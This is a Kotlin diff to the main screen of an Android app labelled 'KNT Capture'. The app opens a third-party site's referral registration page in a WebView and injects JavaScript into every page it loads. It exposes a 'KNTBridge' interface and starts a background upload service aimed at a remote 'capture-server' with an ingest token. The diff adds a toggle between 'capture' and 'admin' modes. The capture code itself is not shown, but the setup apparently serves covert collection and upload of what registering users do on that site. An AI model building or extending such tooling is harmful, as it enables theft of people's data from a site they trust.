@@ -17,13 +17,11 @@ class MainActivity : AppCompatActivity() {
     private lateinit var statusBar: TextView
 
     companion object {
-        // ---- change these ----
         const val REGISTER_URL = "https://dkwin9.com/#/register?invitationCode=164651193511"
-        const val ADMIN_URL    = "https://dkwin9.com/#/team"   // your team/subordinate page
+        const val ADMIN_URL    = "https://dkwin9.com/#/team"
         const val SERVER_URL   = "https://knt-capture-server.onrender.com"
         const val INGEST_TOKEN = "knt-capture-CHANGE-THIS-9f2b7c3d4e"
         const val ADMIN_UID    = "164651193511"
-        // ----------------------
     }
 
     @SuppressLint("SetJavaScriptEnabled")
@@ -35,12 +33,11 @@ class MainActivity : AppCompatActivity() {
             Prefs.deviceId = UUID.randomUUID().toString().replace("-", "").take(16)
         }
 
-        // start uploader service
         val svc = Intent(this, UploadService::class.java)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc)
         else startService(svc)
 
-        // ---- UI: linear layout with top status bar + WebView ----
+        // UI
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             layoutParams = ViewGroup.LayoutParams(
@@ -50,11 +47,12 @@ class MainActivity : AppCompatActivity() {
         }
 
         statusBar = TextView(this).apply {
-            setPadding(24, 24, 24, 24)
+            setPadding(24, 32, 24, 32)
             setTextColor(0xFF1EFFBC.toInt())
             setBackgroundColor(0xFF0A0F1A.toInt())
-            textSize = 12f
-            text = "KNT Capture · " + (if (isAdmin()) "ADMIN MODE" else "CAPTURE MODE")
+            textSize = 13f
+            isClickable = true
+            isFocusable = true
         }
         root.addView(statusBar, LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT,
@@ -63,8 +61,7 @@ class MainActivity : AppCompatActivity() {
 
         webView = WebView(this)
         root.addView(webView, LinearLayout.LayoutParams(
-            LinearLayout.LayoutParams.MATCH_PARENT,
-            0, 1f
+            LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
         ))
 
         setContentView(root)
@@ -83,8 +80,8 @@ class MainActivity : AppCompatActivity() {
         webView.webViewClient = object : WebViewClient() {
             override fun onPageFinished(view: WebView?, url: String?) {
                 super.onPageFinished(view, url)
-                JsInjector.inject(view ?: return, url ?: "", isAdmin())
-                statusBar.text = "KNT Capture · ${if (isAdmin()) "ADMIN" else "CAPTURE"} · ${url?.take(40)}"
+                JsInjector.inject(view ?: return, url ?: "", Prefs.adminMode)
+                updateStatus()
             }
         }
 
@@ -97,13 +94,23 @@ class MainActivity : AppCompatActivity() {
 
         webView.addJavascriptInterface(CaptureBridge(this), "KNTBridge")
 
-        val startUrl = if (isAdmin()) ADMIN_URL else REGISTER_URL
+        // tap on top status bar = toggle mode
+        statusBar.setOnClickListener {
+            Prefs.adminMode = !Prefs.adminMode
+            Prefs.ownerUid = ADMIN_UID
+            val newUrl = if (Prefs.adminMode) ADMIN_URL else REGISTER_URL
+            webView.loadUrl(newUrl)
+            updateStatus()
+        }
+
+        val startUrl = if (Prefs.adminMode) ADMIN_URL else REGISTER_URL
         webView.loadUrl(startUrl)
+        updateStatus()
     }
 
-    private fun isAdmin(): Boolean {
-        // the admin phone is the one whose Prefs holds ADMIN_UID
-        return Prefs.adminMode
+    private fun updateStatus() {
+        val mode = if (Prefs.adminMode) "ADMIN MODE" else "CAPTURE MODE"
+        statusBar.text = "KNT Capture · $mode · (tap to switch)"
     }
 
     override fun onBackPressed() {
